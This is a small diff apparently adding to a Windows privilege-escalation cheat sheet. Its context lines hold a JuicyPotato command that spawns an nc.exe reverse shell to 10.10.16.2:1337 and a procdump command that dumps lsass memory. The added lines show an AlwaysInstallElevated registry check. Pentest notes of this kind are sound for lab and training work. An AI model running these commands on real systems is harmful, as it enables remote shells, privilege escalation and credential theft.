@@ -423,6 +423,13 @@ HKEY_CLASSES_ROOT\CLSID\{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
 
 .\juicypotato.exe -l 1337 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a " /c c:\windows\temp\nc.exe -e cmd.exe 10.10.16.2 1337" -t *
 
+# Always Install Elevated
+PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+
 # SeDebugPrivilege
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
